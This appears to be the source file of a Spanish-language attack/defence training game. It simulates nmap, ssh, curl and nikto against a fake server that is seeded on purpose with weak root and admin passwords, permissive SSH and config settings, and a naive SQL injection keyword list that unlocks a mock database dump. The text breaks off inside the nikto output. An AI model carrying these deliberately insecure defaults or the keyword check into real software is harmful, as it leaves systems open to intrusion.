import React, { createContext, useState, useEffect, ReactNode, useCallback, useRef, useMemo } from 'react';
// import { supabase } from './supabaseClient'; // Inlined below
// import type { ... } from './types'; // Inlined below
// import { ... } from './constants'; // Inlined below
import { RealtimeChannel, createClient } from '@supabase/supabase-js';
import * as R from 'https://aistudiocdn.com/ramda@^0.32.0';
import { GoogleGenAI } from "https://esm.sh/@google/genai";

// ============================================================================
// INLINED CONSTANTS & MOCKS (To resolve dependencies)
// ============================================================================

const RED_TEAM_HELP_TEXT = "<h3>Guía del Equipo Rojo</h3><p>Tu objetivo es comprometer el servidor. Usa herramientas como nmap, hydra y exploits.</p>";
const BLUE_TEAM_HELP_TEXT = "<h3>Guía del Equipo Azul</h3><p>Tu objetivo es defender el servidor. Analiza logs, configura el firewall y parchea servicios.</p>";
const GENERAL_HELP_TEXT = "<p>Usa 'help' para ver comandos disponibles.</p>";
const SCENARIO_7_GUIDE = "Guía Experta Escenario 7: Análisis de Logs y Hardening SSH...";
const SCENARIO_8_GUIDE = "Guía Experta Escenario 8: Mitigación de DoS...";
const SCENARIO_9_GUIDE = "Guía Experta Escenario 9: Kill Chain Response...";

const SCENARIO_HELP_TEXTS: Record<string, any> = {
    'escenario7': { general: "Hardening SSH", red: "Intenta fuerza bruta", blue: "Configura sshd_config" },
    'escenario8': { general: "Mitigación DoS", red: "Usa hping3", blue: "Usa iptables/ufw" },
    'escenario9': { general: "Kill Chain", red: "Pivotar", blue: "Detectar intrusión" }
};

const TRAINING_SCENARIOS: InteractiveScenario[] = [
    {
        id: 'escenario11',
        title: 'Incidente Completo',
        description: 'Simulación de ataque y defensa en tiempo real',
        isInteractive: true,
        initialEnvironment: {
            networks: {
                dmz: {
                    firewall: { enabled: true, rules: [] },
                    hosts: [
                        {
                            ip: '10.0.10.5',
                            hostname: 'APP-SERVER-01',
                            files: [
                                { path: '/var/www/html/index.php', content: '<html>Welcome</html>', permissions: '644' },
                                { path: '/var/www/html/login.php', content: '<?php ... ?>', permissions: '644' },
                                { path: '/var/www/html/admin.php', content: '<?php ... ?>', permissions: '600' },
                                { path: '/etc/ssh/sshd_config', content: 'PermitRootLogin yes', permissions: '644' },
                                { path: '/var/www/html/db_config.php', content: 'db_pass=root', permissions: '644' }
                            ],
                            services: {
                                80: { state: 'open', name: 'http', version: 'Apache/2.4.46', vulnerabilities: [] },
                                22: { state: 'open', name: 'ssh', version: 'OpenSSH 8.2', vulnerabilities: [] },
                                3306: { state: 'open', name: 'mysql', version: 'MySQL 8.0', vulnerabilities: [] }
                            },
                            users: [
                                { username: 'root', password: 'toor' },
                                { username: 'admin', password: 'P@ssw0rd' }
                            ],
                            systemState: { cpuLoad: 5, networkConnections: 10, failedLogins: 0 }
                        }
                    ]
                }
            },
            attackProgress: { reconnaissance: [], credentials: {}, persistence: [], compromised: [] },
            defenseProgress: { blockedIPs: [], patchedVulnerabilities: [] },
            timeline: []
        }
    }
];

// Mock Supabase Client for Compilation
const supabase = {
    channel: (name: string) => ({
        on: () => ({ on: () => ({ subscribe: () => {} }) }),
        subscribe: () => {}
    }),
    removeChannel: () => {},
    from: (table: string) => ({
        select: (cols: string) => ({
            eq: (col: string, val: any) => ({
                single: async () => ({ data: null }),
                order: () => Promise.resolve({ data: [] })
            })
        }),
        update: (data: any) => ({ eq: () => Promise.resolve({ error: null }) }),
        insert: (data: any) => Promise.resolve({ error: null }),
        delete: () => ({ eq: () => Promise.resolve({ error: null }) })
    })
};

// ============================================================================
// INLINED TYPES
// ============================================================================

export interface VirtualFile {
    path: string;
    content: string;
    permissions: string;
    hash?: string;
}

export interface Service {
    state: 'open' | 'closed';
    name: string;
    version: string;
    vulnerabilities?: any[];
}

export interface UserAccount {
    username: string;
    password: string;
}

export interface VirtualHost {
    ip: string;
    hostname: string;
    files: VirtualFile[];
    services: Record<number, Service>;
    users: UserAccount[];
    systemState?: {
        cpuLoad: number;
        networkConnections: number;
        failedLogins: number;
    };
}

export interface FirewallRule {
    id: string;
    action: 'allow' | 'deny';
    protocol: string;
    destPort?: number;
    sourceIP?: string;
}

export interface FirewallState {
    enabled: boolean;
    rules: FirewallRule[];
}

export interface Network {
    firewall: FirewallState;
    hosts: VirtualHost[];
}

export interface VirtualEnvironment {
    networks: Record<string, Network>;
    attackProgress: {
        reconnaissance: string[];
        credentials: Record<string, string>;
        persistence: string[];
        compromised: string[];
    };
    defenseProgress: {
        blockedIPs: string[];
        patchedVulnerabilities: string[];
    };
    timeline: LogEntry[];
}

export interface LogEntry {
    id?: number;
    session_id?: string;
    timestamp: string;
    message: string;
    team_visible: string;
    source_team: string;
}

export interface SessionData {
    sessionId: string;
    team: 'red' | 'blue' | 'spectator';
}

export interface TerminalLine {
    text?: string;
    html?: string;
    type: 'output' | 'error' | 'command' | 'html';
}

export interface PromptState {
    user: string;
    host: string;
    dir: string;
}

export interface TerminalState {
    id: string;
    name: string;
    output: TerminalLine[];
    prompt: PromptState;
    originalPrompt?: PromptState; // For nested sessions like SSH
    currentHostIp?: string; // To track where the terminal is connected
    history: string[];
    historyIndex: number;
    input: string;
    mode: 'normal' | 'editor';
    isBusy: boolean;
    type?: string; // Legacy support
}

export interface ActiveProcess {
    command: string;
    type: string;
}

export interface InteractiveScenario {
    id: string;
    title: string;
    description: string;
    isInteractive: boolean;
    initialEnvironment: VirtualEnvironment;
}

export interface CommandContext {
    userTeam: 'red' | 'blue';
    terminalState: TerminalState;
    environment: VirtualEnvironment;
    activeScenario: InteractiveScenario | null;
    setEnvironment: React.Dispatch<React.SetStateAction<VirtualEnvironment | null>>;
    startScenario: (id: string) => Promise<boolean>;
}

export interface CommandResult {
    output: TerminalLine[];
    newTerminalState?: Partial<TerminalState>;
    newEnvironment?: VirtualEnvironment;
    clear?: boolean;
    duration?: number; // Simulated delay
    process?: ActiveProcess;
}

export type CommandHandler = (args: string[], context: CommandContext) => Promise<CommandResult>;

// ============================================================================
// DB State Type (Matches actual Supabase schema)
// ============================================================================

interface SimulationStateRow {
    session_id: string;
    active_scenario?: string;
    // Environment state columns
    firewall_enabled?: boolean;
    ssh_hardened?: boolean;
    banned_ips?: string[];
    payload_deployed?: boolean;
    is_dos_active?: boolean;
    admin_password_found?: boolean;
    db_config_permissions?: string;
    hydra_run_count?: number;
    server_load?: number;
    // Terminal state columns (now storing arrays for multi-terminal support)
    terminal_output_red?: TerminalState[];
    terminal_output_blue?: TerminalState[];
    // For backward compatibility with old data schemas
    prompt_red?: PromptState;
    prompt_blue?: PromptState;
}

// ============================================================================
// Data Mapping Functions (Code <-> DB)
// ============================================================================

const mapEnvironmentToDbRow = (env: VirtualEnvironment | null): Partial<SimulationStateRow> => {
    if (!env) return {};
    const host = env.networks.dmz?.hosts[0];
    if (!host) return {};
    return {
        firewall_enabled: env.networks.dmz.firewall.enabled,
        ssh_hardened: host.files.find(f => f.path === '/etc/ssh/sshd_config')?.content?.includes('PermitRootLogin no'),
        banned_ips: env.defenseProgress.blockedIPs,
        payload_deployed: !!env.attackProgress.persistence.length,
        is_dos_active: (host.systemState?.cpuLoad ?? 0) > 90,
        admin_password_found: !!env.attackProgress.credentials['root@10.0.10.5'],
        db_config_permissions: host.files.find(f => f.path === '/var/www/html/db_config.php')?.permissions,
        server_load: host.systemState?.cpuLoad,
    };
};

const mapDbRowToEnvironment = (row: SimulationStateRow, scenario: InteractiveScenario): VirtualEnvironment => {
    const baseEnv = R.clone(scenario.initialEnvironment);
    const host = baseEnv.networks.dmz?.hosts[0];
    if (!host) return baseEnv;

    baseEnv.networks.dmz.firewall.enabled = row.firewall_enabled ?? baseEnv.networks.dmz.firewall.enabled;
    const sshConfigFile = host.files.find(f => f.path === '/etc/ssh/sshd_config');
    if (sshConfigFile && row.ssh_hardened) {
        sshConfigFile.content = 'PermitRootLogin no';
    }
    const dbConfigFile = host.files.find(f => f.path === '/var/www/html/db_config.php');
     if (dbConfigFile && row.db_config_permissions) {
        dbConfigFile.permissions = row.db_config_permissions;
    }
    if(host.systemState) {
        host.systemState.cpuLoad = row.server_load ?? host.systemState.cpuLoad;
    }
    if (row.banned_ips) {
        baseEnv.defenseProgress.blockedIPs = row.banned_ips;
    }

    return baseEnv;
};

const mapTerminalsToDbRow = (terminals: TerminalState[]): Partial<SimulationStateRow> => {
    return {
        terminal_output_red: terminals.filter(t => t.id.startsWith('red')),
        terminal_output_blue: terminals.filter(t => t.id.startsWith('blue')),
    };
};

const mapDbRowToTerminals = (row: SimulationStateRow): TerminalState[] => {
    const redTerminals: TerminalState[] = [];
    const blueTerminals: TerminalState[] = [];
    const defaultRedPrompt: PromptState = { user: 'pasante-red', host: 'kali', dir: '~' };
    const defaultBluePrompt: PromptState = { user: 'pasante-blue', host: 'soc-valtorix', dir: '~' };

    const redData = row.terminal_output_red as any[] | undefined;
    if (Array.isArray(redData)) {
        if (redData.length > 0 && typeof redData[0].id === 'string') {
            redTerminals.push(...(redData as TerminalState[]));
        } else if (redData.length > 0 && typeof redData[0].type === 'string') {
            redTerminals.push({
                id: 'red-1',
                name: 'Terminal Rojo 1',
                output: redData as TerminalLine[],
                prompt: row.prompt_red || defaultRedPrompt,
                history: [],
                historyIndex: -1,
                input: '',
                mode: 'normal',
                isBusy: false,
            });
        }
    }

    const blueData = row.terminal_output_blue as any[] | undefined;
    if (Array.isArray(blueData)) {
        if (blueData.length > 0 && typeof blueData[0].id === 'string') {
            blueTerminals.push(...(blueData as TerminalState[]));
        } else if (blueData.length > 0 && typeof blueData[0].type === 'string') {
            blueTerminals.push({
                id: 'blue-1',
                name: 'Terminal Azul 1',
                output: blueData as TerminalLine[],
                prompt: row.prompt_blue || defaultBluePrompt,
                history: [],
                historyIndex: -1,
                input: '',
                mode: 'normal',
                isBusy: false,
            });
        }
    }

    return [...redTerminals, ...blueTerminals];
};


// ============================================================================
// Command Helpers
// ============================================================================

const findHost = (env: VirtualEnvironment | null, hostnameOrIp: string | null): VirtualHost | undefined => {
    if (!env || !hostnameOrIp) return undefined;
    const searchTerm = hostnameOrIp.toLowerCase();
    for (const network of Object.values(env.networks) as any[]) {
        const host = network.hosts.find((h: VirtualHost) => h.ip === searchTerm || h.hostname.toLowerCase() === searchTerm);
        if (host) return host;
    }
    return undefined;
};

const updateHostState = (env: VirtualEnvironment, hostIp: string, updates: Partial<VirtualHost['systemState']>) => {
    const newEnv = R.clone(env);
    for (const networkId in newEnv.networks) {
        const hostIndex = newEnv.networks[networkId].hosts.findIndex(h => h.ip === hostIp);
        if (hostIndex !== -1) {
            const hostPath = ['networks', networkId, 'hosts', hostIndex, 'systemState'];
            const currentSystemState = R.path(hostPath, newEnv) || {};
            const newSystemState = { ...currentSystemState, ...updates };
            return R.set(R.lensPath(hostPath), newSystemState, newEnv);
        }
    }
    return newEnv;
};

// Robust Argument Parser
const parseArguments = (command: string): string[] => {
    const args: string[] = [];
    let current = '';
    let inQuote = false;
    
    for (let i = 0; i < command.length; i++) {
        const char = command[i];
        if (char === '"' || char === "'") {
            inQuote = !inQuote;
        } else if (char === ' ' && !inQuote) {
            if (current) args.push(current);
            current = '';
        } else {
            current += char;
        }
    }
    if (current) args.push(current);
    return args;
};

// Helper to extract URL from curl/wget commands
const extractUrlInfo = (url: string): { host: string; path: string; params: URLSearchParams } => {
    try {
        // Remove http:// or https:// prefix
        let cleanUrl = url.replace(/^https?:\/\//, '');
        
        // Split host and path
        const slashIndex = cleanUrl.indexOf('/');
        let host = slashIndex > -1 ? cleanUrl.substring(0, slashIndex) : cleanUrl;
        let pathWithParams = slashIndex > -1 ? cleanUrl.substring(slashIndex) : '/';
        
        // Split path and query params
        const queryIndex = pathWithParams.indexOf('?');
        let path = queryIndex > -1 ? pathWithParams.substring(0, queryIndex) : pathWithParams;
        let queryString = queryIndex > -1 ? pathWithParams.substring(queryIndex + 1) : '';
        
        return {
            host: host,
            path: path,
            params: new URLSearchParams(queryString)
        };
    } catch (e) {
        return { host: url, path: '/', params: new URLSearchParams() };
    }
};

// ============================================================================
// COMMAND LIBRARY
// ============================================================================

const commandLibrary: { [key: string]: CommandHandler } = {
    help: async (args, { userTeam }) => {
        const scenarioId = args[0];
        if (scenarioId && SCENARIO_HELP_TEXTS[scenarioId]) {
            const helpTexts = SCENARIO_HELP_TEXTS[scenarioId];
            const teamHelp = userTeam === 'red' ? helpTexts.red : helpTexts.blue;
            return { output: [{ html: helpTexts.general + teamHelp, type: 'html' }] };
        }
        return { output: [{ html: (userTeam === 'red' ? RED_TEAM_HELP_TEXT : BLUE_TEAM_HELP_TEXT) + GENERAL_HELP_TEXT, type: 'html' }] };
    },
    
    // AI Analyst Integration
    analyze: async (args, { environment, userTeam, activeScenario }) => {
        if (!process.env.API_KEY) {
            return { output: [{ text: "Error: API_KEY no configurada para el Analista Virtual.", type: 'error' }] };
        }
        
        const logs = environment.timeline.slice(-15).map(l => `[${l.source_team || 'SYS'}] ${l.message}`).join('\n');
        const scenarioContext = activeScenario ? `Escenario: ${activeScenario.title}. Desc: ${activeScenario.description}` : "Sin escenario activo.";
        
        let expertContext = "";
        if (activeScenario?.id === 'escenario7') {
            expertContext = `\nIMPORTANTE: Usa la siguiente GUÍA EXPERTA PARA ESCENARIO 7 para asistir al usuario. No des la respuesta directa inmediatamente, guía paso a paso:\n${SCENARIO_7_GUIDE}\n`;
        } else if (activeScenario?.id === 'escenario8') {
            expertContext = `\nIMPORTANTE: Usa la siguiente GUÍA EXPERTA PARA ESCENARIO 8 para asistir al usuario. Enfócate en mitigación de DoS:\n${SCENARIO_8_GUIDE}\n`;
        } else if (activeScenario?.id === 'escenario9') {
            expertContext = `\nIMPORTANTE: Usa la siguiente GUÍA EXPERTA PARA ESCENARIO 9 para asistir al usuario. Este escenario es Kill Chain (LFI -> RCE -> Pivot):\n${SCENARIO_9_GUIDE}\n`;
        }

        const teamContext = `Eres el analista de seguridad IA para el Equipo ${userTeam === 'red' ? 'Rojo (Atacante)' : 'Azul (Defensor)'}.`;
        
        const prompt = `${teamContext}
Contexto del juego: ${scenarioContext}
${expertContext}
Últimos logs del sistema:
${logs}

Analiza la situación brevemente (max 3 lineas) y sugiere el siguiente comando técnico más lógico para mi equipo basándote en la guía experta si aplica. Sé directo y táctico.`;

        try {
            const ai = new GoogleGenAI({ apiKey: process.env.API_KEY });
            const response = await ai.models.generateContent({
                model: 'gemini-2.5-flash',
                contents: prompt,
            });
            
            return { output: [{ html: `<strong class="text-cyan-400">Analista Virtual (AI):</strong><br/>${response.text}`, type: 'html' }] };
        } catch (error) {
            return { output: [{ text: "Error conectando con el Analista Virtual.", type: 'error' }] };
        }
    },
    
    'start-scenario': async(args, { startScenario }) => {
        if (!args[0]) return { output: [{ text: "Uso: start-scenario <id_escenario>", type: 'error'}] };
        const success = await startScenario(args[0]);
        if (success) {
            return { output: [{ html: `Escenario <strong class="text-amber-300">${args[0]}</strong> activado. Entorno reiniciado.`, type: 'html' }] };
        }
        return { output: [{ text: `Error: Escenario '${args[0]}' no encontrado o no es interactivo.`, type: 'error' }] };
    },
    
    clear: async () => ({ output: [], clear: true }),
    
    marca: async () => ({ output: [{ html: `<pre class="text-yellow-300">
    ______      __          __      __             __  _
   / ____/_   __ / /_ _____   / /__   / /_    ____ _ / /_ (_)____    ____ _
  / /    / / / // __// ___/   / //_/  / __ \\ / __ \`// __// // __ \\ / __ \`/
 / /___ / /_/ // /_ / /__    / ,<    / / / // /_/ // /_ / // / / // /_/ /
 \\____/ \\__,_/ \\__//\\___/   /_/|_|  /_/ /_/ \\__,_/ \\__//_//_/ /_/ \\__, /
                                                                   /____/
</pre>`, type: 'html'}]}),
    
    whoami: async (args, { terminalState }) => ({ output: [{ text: terminalState.prompt.user, type: 'output' }] }),
    
    id: async (args, { terminalState }) => {
        const user = terminalState.prompt.user;
        if (user === 'root') {
            return { output: [{ text: 'uid=0(root) gid=0(root) groups=0(root)', type: 'output' }] };
        }
        return { output: [{ text: `uid=1000(${user}) gid=1000(${user}) groups=1000(${user}),27(sudo)`, type: 'output' }] };
    },
    
    uname: async (args) => {
        if (args.includes('-a')) {
            return { output: [{ text: 'Linux APP-SERVER-01 5.4.0-42-generic #46-Ubuntu SMP Fri Jul 10 00:24:02 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux', type: 'output' }] };
        }
        return { output: [{ text: 'Linux', type: 'output' }] };
    },
    
    exit: async (args, { terminalState }) => {
        if (!terminalState.originalPrompt) return { output: [{text: "No estás en una sesión SSH.", type: 'error'}]};
        return {
            output: [{ text: `Cerrando conexión con ${terminalState.prompt.host}...`, type: 'output' }],
            newTerminalState: { prompt: terminalState.originalPrompt, originalPrompt: undefined, currentHostIp: undefined }
        };
    },
    
    ssh: async (args, { environment, terminalState }) => {
        if (args.length < 1) return { output: [{ text: "Uso: ssh <usuario>@<host>", type: 'error' }] };
        const [user, host] = args[0].split('@');
        if (!user || !host) return { output: [{ text: "Formato incorrecto. Uso: ssh <usuario>@<host>", type: 'error' }] };

        const targetHost = findHost(environment, host);
        if (!targetHost) return { output: [{ text: `Host desconocido: ${host}`, type: 'error' }] };

        // PIVOTING LOGIC for Scenario 9
        if (terminalState.currentHostIp === '10.0.0.10' && targetHost.ip === '10.10.0.50') {
            // Allow pivoting
        } else if (targetHost.ip === '10.10.0.50' && !terminalState.currentHostIp) {
             return { output: [{ text: `ssh: connect to host ${targetHost.ip} port 22: Connection timed out`, type: 'error' }], duration: 2000 };
        }
        
        const userAccount = targetHost.users.find(u => u.username === user);
        
        // Specific logic for scenario 7 root login restriction
        if (user === 'root') {
            const sshConfig = targetHost.files.find(f => f.path === '/etc/ssh/sshd_config');
            if (sshConfig?.content.includes('PermitRootLogin no')) {
                return { output: [{ text: `root@${host}: Permission denied (publickey).`, type: 'error' }], duration: 1500 };
            }
        }
        
        const validCreds = (userAccount && (userAccount.password === 'toor' || userAccount.password === 'P@ssw0rd' || userAccount.password === 'Password123' || userAccount.password === 'DbP@ss2024!'));
        const hasFoundCreds = environment.attackProgress.credentials[`${user}@${targetHost.ip}`];

        if (!userAccount || (!validCreds && !hasFoundCreds)) {
            const newEnv = updateHostState(environment, targetHost.ip, { failedLogins: (targetHost.systemState?.failedLogins || 0) + 1 });
            return { output: [{ text: `Permission denied, please try again.`, type: 'error' }], duration: 1500, newEnvironment: newEnv };
        }

        const newEnv = R.clone(environment);
        if (!newEnv.attackProgress.compromised.includes(targetHost.ip)) {
             newEnv.attackProgress.compromised.push(targetHost.ip);
        }
        
        return {
            output: [{ text: `Bienvenido a ${targetHost.hostname}.`, type: 'output' }],
            duration: 1000,
            newTerminalState: {
                prompt: { user, host: targetHost.hostname, dir: '~' },
                originalPrompt: terminalState.prompt,
                currentHostIp: targetHost.ip
            },
            newEnvironment: newEnv
        };
    },
    
    nmap: async (args, { environment, terminalState }) => {
        const target = args.find(arg => !arg.startsWith('-'));
        if (!target) return { output: [{ text: 'Se requiere un objetivo. Uso: nmap [opciones] <host>', type: 'error' }]};

        const targetHost = findHost(environment, target);
        
        // Pivoting check for Nmap
        if (targetHost?.ip === '10.10.0.50' && terminalState.currentHostIp !== '10.0.0.10') {
             return { output: [{ text: `Note: Host ${target} seems down.`, type: 'output' }], duration: 1500 };
        }

        if (!targetHost) return { output: [{ text: `Note: Host ${target} seems down.`, type: 'output' }], duration: 1500 };

        const fw = environment.networks.dmz.firewall;
        const visiblePorts = Object.entries(targetHost.services).filter(([port]) => {
            if (!fw.enabled) return true;
            const portNum = parseInt(port);
            const isDenied = fw.rules.some(r => r.action === 'deny' && (r.destPort === portNum || !r.destPort) && (!r.sourceIP || r.sourceIP === 'Anywhere'));
            if (isDenied) return false;
            return fw.rules.some(r => r.action === 'allow' && (r.destPort === portNum || !r.destPort) && (!r.sourceIP || r.sourceIP === 'Anywhere'));
        });
        
        let outputText = `\nStarting Nmap 7.94 ( https://nmap.org )\nNmap scan report for ${targetHost.hostname} (${targetHost.ip})\nHost is up (0.00023s latency).\n`;
        const filteredCount = Object.keys(targetHost.services).length - visiblePorts.length;
        if (filteredCount > 0) outputText += `Not shown: ${filteredCount} filtered tcp ports (no-response)\n`;
        
        outputText += 'PORT\tSTATE\tSERVICE\tVERSION\n';
        visiblePorts.forEach(([port, rawService]) => {
            const service = rawService as any;
            outputText += `${port}/tcp\t${service.state}\t${service.name}\t${service.version}\n`;
        });
        
        // Show scripts output if -sC or --script is used
        if (args.includes('-sC') || args.includes('-sV') || args.some(a => a.startsWith('--script'))) {
            outputText += `\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n`;
            
            // Check for vulnerabilities
            visiblePorts.forEach(([port, rawService]) => {
                const service = rawService as any;
                if (service.vulnerabilities && service.vulnerabilities.length > 0) {
                    outputText += `\n|_http-vuln-check: \n`;
                    service.vulnerabilities.forEach((v: any) => {
                        outputText += `|    ${v.cve}: ${v.description} [${v.severity.toUpperCase()}]\n`;
                    });
                }
            });
        }
        
        // http-enum script output
        if (args.some(a => a.includes('http-enum'))) {
            outputText += `\n| http-enum: \n|    /login.php: Possible admin login page\n|    /admin.php: Admin panel\n|    /config/: Configuration directory\n|_  /backup/: Backup directory\n`;
        }
        
        const newEnv = R.clone(environment);
        if (!newEnv.attackProgress.reconnaissance.includes(targetHost.hostname)) {
            newEnv.attackProgress.reconnaissance.push(targetHost.hostname);
        }
        if (!newEnv.attackProgress.reconnaissance.includes(targetHost.ip)) {
            newEnv.attackProgress.reconnaissance.push(targetHost.ip);
        }
        
        return { output: [{ text: outputText, type: 'output' }], duration: 2500, newEnvironment: newEnv };
    },
    
    // =========================================================================
    // CURL - ENHANCED FOR SCENARIO 11
    // =========================================================================
    curl: async (args, { environment, terminalState }) => {
        // Parse curl arguments
        const hasHeaders = args.includes('-I') || args.includes('--head');
        const hasVerbose = args.includes('-v');
        const methodIndex = args.findIndex(a => a === '-X');
        const method = methodIndex > -1 ? args[methodIndex + 1]?.toUpperCase() : 'GET';
        const dataIndex = args.findIndex(a => a === '-d' || a === '--data');
        const postData = dataIndex > -1 ? args[dataIndex + 1] : null;
        
        // Find URL (argument that's not a flag or flag value)
        let url = '';
        for (let i = 0; i < args.length; i++) {
            const arg = args[i];
            if (arg.startsWith('-')) {
                // Skip flag and its value
                if (['-X', '-d', '--data', '-H', '--header', '-o', '-O'].includes(arg)) {
                    i++; // Skip next arg too
                }
                continue;
            }
            if (arg.includes('://') || arg.includes('/') || arg.includes('.')) {
                url = arg;
                break;
            }
        }
        
        if (!url) return { output: [{ text: 'curl: se requiere una URL', type: 'error' }] };
        
        const urlInfo = extractUrlInfo(url);
        const targetHost = findHost(environment, urlInfo.host);
        
        if (!targetHost) {
            return { output: [{ text: `curl: (6) Could not resolve host: ${urlInfo.host}`, type: 'error' }] };
        }
        
        // Check if HTTP service is available
        const httpService = targetHost.services[80] || targetHost.services[443];
        if (!httpService || httpService.state !== 'open') {
            return { output: [{ text: `curl: (7) Failed to connect to ${urlInfo.host} port 80: Connection refused`, type: 'error' }] };
        }
        
        const newEnv = R.clone(environment);
        let outputText = '';
        
        // Headers only mode
        if (hasHeaders) {
            outputText = `HTTP/1.1 200 OK
Date: ${new Date().toUTCString()}
Server: ${httpService.version}
X-Powered-By: PHP/7.4.3
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
`;
            return { output: [{ text: outputText, type: 'output' }], duration: 500 };
        }
        
        // Find file being requested
        const requestedPath = urlInfo.path === '/' ? '/var/www/html/index.php' : `/var/www/html${urlInfo.path}`;
        const requestedFile = targetHost.files.find(f => f.path === requestedPath || f.path === `/var/www/html/${urlInfo.path.replace(/^\//, '')}`);
        
        // =========================================================================
        // SQL INJECTION DETECTION IN LOGIN.PHP (POST)
        // =========================================================================
        if (urlInfo.path.includes('login.php') && method === 'POST' && postData) {
            // Parse POST data
            const params = new URLSearchParams(postData);
            const user = params.get('user') || params.get('username') || '';
            const pass = params.get('pass') || params.get('password') || '';
            
            // Detect SQL Injection patterns
            const sqliPatterns = ["'", "OR", "UNION", "SELECT", "--", "1=1", "1'='1"];
            const hasSqli = sqliPatterns.some(p => user.toUpperCase().includes(p) || pass.toUpperCase().includes(p));
            
            if (hasSqli) {
                // SQL Injection successful!
                newEnv.attackProgress.persistence.push('sqli_successful');
                newEnv.timeline.push({
                    id: Date.now(),
                    timestamp: new Date().toISOString(),
                    message: `SQL Injection detectado en login.php desde 192.168.1.100`,
                    team_visible: 'all',
                    source_team: 'red'
                });
                
                outputText = `<!DOCTYPE html>
<html>
<head><title>Login Result</title></head>
<body>
<h2>Welcome Administrator!</h2>
<p>Login successful. Redirecting to admin panel...</p>
<script>window.location.href='/admin.php';</script>
<!-- DEBUG: Query executed: SELECT * FROM users WHERE user='${user}' AND pass='${pass}' -->
<!-- SQL returned 1 row - authentication bypassed -->
</body>
</html>`;
                
                return { 
                    output: [{ html: `<pre class="text-green-400">${outputText}</pre>`, type: 'html' }], 
                    duration: 1000,
                    newEnvironment: newEnv 
                };
            } else {
                // Normal failed login
                outputText = `<!DOCTYPE html>
<html>
<head><title>Login Failed</title></head>
<body>
<h2>Login Failed</h2>
<p>Invalid username or password.</p>
</body>
</html>`;
                return { output: [{ text: outputText, type: 'output' }], duration: 500 };
            }
        }
        
        // =========================================================================
        // ADMIN.PHP ACCESS
        // =========================================================================
        if (urlInfo.path.includes('admin.php')) {
            const hasSqliAccess = newEnv.attackProgress.persistence.includes('sqli_successful');
            
            // Check for data dump action
            if (urlInfo.params.get('action') === 'dump_db' || url.includes('dump_db')) {
                if (hasSqliAccess) {
                    newEnv.attackProgress.persistence.push('data_exfiltrated');
                    outputText = `<!DOCTYPE html>
<html>
<head><title>Database Export</title></head>
<body>
<h2>Database Export - CONFIDENTIAL</h2>
<h3>Table: users</h3>
<pre>
+----+----------+------------------+------------+
| id | username | password         | role       |
+----+----------+------------------+------------+
|  1 | admin    | WebAdmin2024!    | superadmin |
|  2 | webadmin | WebAdmin2024!    | admin      |
|  3 | dbuser   | DbUser123        | user       |
+----+----------+------------------+------------+
</pre>
<h3>Table: customers</h3>
<pre>
+----+------------------+---------------------+------------------+
| id | email            | credit_card         | ssn              |
+----+------------------+---------------------+------------------+
|  1 | john@example.com | 4532-XXXX-XXXX-1234 | XXX-XX-1234      |
|  2 | jane@example.com | 5412-XXXX-XXXX-5678 | XXX-XX-5678      |
+----+------------------+---------------------+------------------+
</pre>
<p style="color:red;">WARNING: Sensitive data exported!</p>
</body>
</html>`;
                    return { 
                        output: [{ html: `<pre class="text-red-400">${outputText}</pre>`, type: 'html' }], 
                        duration: 1500,
                        newEnvironment: newEnv 
                    };
                }
            }
            
            if (hasSqliAccess) {
                newEnv.timeline.push({
                    id: Date.now(),
                    timestamp: new Date().toISOString(),
                    message: `Acceso a panel de administración admin.php`,
                    team_visible: 'all',
                    source_team: 'red'
                });
                
                outputText = `<!DOCTYPE html>
<html>
<head><title>Admin Panel - APP-SERVER-01</title></head>
<body>
<h1>Administrator Control Panel</h1>
<div class="menu">
  <a href="/admin.php?action=users">Manage Users</a>
  <a href="/admin.php?action=dump_db">Export Database</a>
  <a href="/admin.php?action=logs">View Logs</a>
  <a href="/admin.php?action=config">System Config</a>
</div>
<p>Welcome, Administrator! You have full access.</p>
<p>Server: APP-SERVER-01 | MySQL: Connected | Users: 3</p>
</body>
</html>`;
                return { 
                    output: [{ html: `<pre class="text-green-400">${outputText}</pre>`, type: 'html' }], 
                    duration: 800,
                    newEnvironment: newEnv 
                };
            } else {
                outputText = `<!DOCTYPE html>
<html>
<head><title>403 Forbidden</title></head>
<body>
<h1>403 Forbidden</h1>
<p>You don't have permission to access this resource.</p>
</body>
</html>`;
                return { output: [{ text: outputText, type: 'output' }], duration: 500 };
            }
        }
        
        // =========================================================================
        // REGULAR FILE ACCESS
        // =========================================================================
        if (requestedFile) {
            outputText = requestedFile.content || `<html><body><h1>Page content</h1></body></html>`;
        } else if (urlInfo.path === '/' || urlInfo.path.includes('index')) {
            outputText = `<!DOCTYPE html>
<html>
<head><title>Welcome - APP-SERVER-01</title></head>
<body>
<h1>Welcome to APP-SERVER-01</h1>
<p>Corporate Application Server</p>
<nav>
  <a href="/login.php">Login</a>
</nav>
</body>
</html>`;
        } else {
            return { output: [{ text: `<!DOCTYPE html>\n<html>\n<head><title>404 Not Found</title></head>\n<body>\n<h1>404 Not Found</h1>\n<p>The requested URL ${urlInfo.path} was not found on this server.</p>\n</body>\n</html>`, type: 'output' }] };
        }
        
        return { output: [{ text: outputText, type: 'output' }], duration: 500 };
    },
    
    // =========================================================================
    // NIKTO - WEB VULNERABILITY SCANNER (NEW)
    // =========================================================================
    nikto: async (args, { environment }) => {
        const hostArg = args.find(a => a === '-h' || a === '-host');
        const hostIndex = hostArg ? args.indexOf(hostArg) + 1 : -1;
        const target = hostIndex > 0 ? args[hostIndex] : args.find(a => !a.startsWith('-'));
        
        if (!target) return { output: [{ text: "Uso: nikto -h <host>", type: 'error' }] };
        
        const cleanTarget = target.replace(/^https?:\/\//, '');
        const targetHost = findHost(environment, cleanTarget);
        
        if (!targetHost) {
            return { output: [{ text: `- Nikto v2.1.6\n---------------------------------------------------------------------------\n+ ERROR: Cannot resolve hostname ${cleanTarget}`, type: 'error' }] };
        }
        
        const newEnv = R.clone(environment);
        if (!newEnv.attackProgress.reconnaissance.includes('nikto_scan')) {
            newEnv.attackProgress.reconnaissance.push('nikto_scan');
        }
        
        let outputText = `- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          ${targetHost.ip}
+ Target Hostname:    ${targetHost.hostname}
+ Target Port:        80
+ Start Time:         ${new Date().toISOString()}
---------------------------------------------------------------------------
+ Server: Apache/2.4.46 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present.
+ /: The X-XSS-Protection header is not defined.
+ /: The X-Content-Type-Options header is not set.
